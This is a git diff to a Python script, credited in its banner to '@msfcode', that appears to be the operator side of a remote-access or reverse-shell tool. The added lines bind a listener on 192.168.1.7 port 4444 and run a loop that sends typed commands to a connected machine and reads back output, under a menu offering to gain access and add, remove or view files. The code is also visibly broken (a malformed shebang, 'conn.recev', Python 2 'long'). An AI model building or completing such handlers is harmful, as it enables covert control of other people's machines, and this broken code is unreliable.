@@ -1,7 +1,7 @@
 #!/bin/bash/env python3
 import os
 import sys
-import socket
+import socket, subprocess as sp
 print("                                             Coded By @msfcode                     ")
 print("                                             exploits, Coffee                                  ")
 print("                                                KEEP-CALM")
@@ -47,15 +47,31 @@ if number == 2:
    print("                       #GAiN_ACCESS  #add_files #remove_files #view_files #add_directory #delete_directory ")
    print("")
    print("")
-   s = socket.socket()
-   host = socket.gethostname()
+   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+   host = "192.168.1.7"
    port = 4444
    s.bind((host,port))
-   print("                                      The Server is Currently Running Dude @ ", host)
+   print("                                      [*] The Server is Currently Running Dude", host)
    print("")
-   print("                                       Waiting for any incomming connections...")
+   print("                                      [*] Waiting for any incomming connections...")
    s.listen(1)
    conn, addr = s.accept()
    print("")
-   print(addr, "Connected..")
+   print(addr, "[*] Connected to ", host)
    print("")
+   while 1:
+     command = input("#> ")
+     if command != ("exit()"):
+       if command == "": continue
+       conn.send(command) 
+       result = conn.recev(1024)
+       total_size = long(result[:16])
+       result = result[16:]
+       while total_size > len(result):
+        data = conn.recev(1024)
+        result += data
+       else:
+        conn.send("exit()")
+        print("[*]Sorry,Dude try again...[*]")
+        break
+s.close()
